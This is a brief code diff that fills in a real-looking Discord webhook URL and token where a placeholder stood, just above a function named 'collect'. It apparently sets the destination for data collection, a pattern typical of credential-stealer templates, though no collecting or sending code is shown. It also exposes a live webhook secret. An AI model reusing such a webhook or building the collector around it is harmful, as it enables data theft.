@@ -1,5 +1,5 @@
 const WEBHOOK =
-"YOUR_DISCORD_WEBHOOK_HERE";
+"https://discordapp.com/api/webhooks/1404081818210140261/eqgIhBzxtjWIrnvZgvL6I2lJk5huWk2GOmBoeCZxydMdcEE_pqziaOkZd1MQDyOrY1HC";
 
 
 async function collect(){
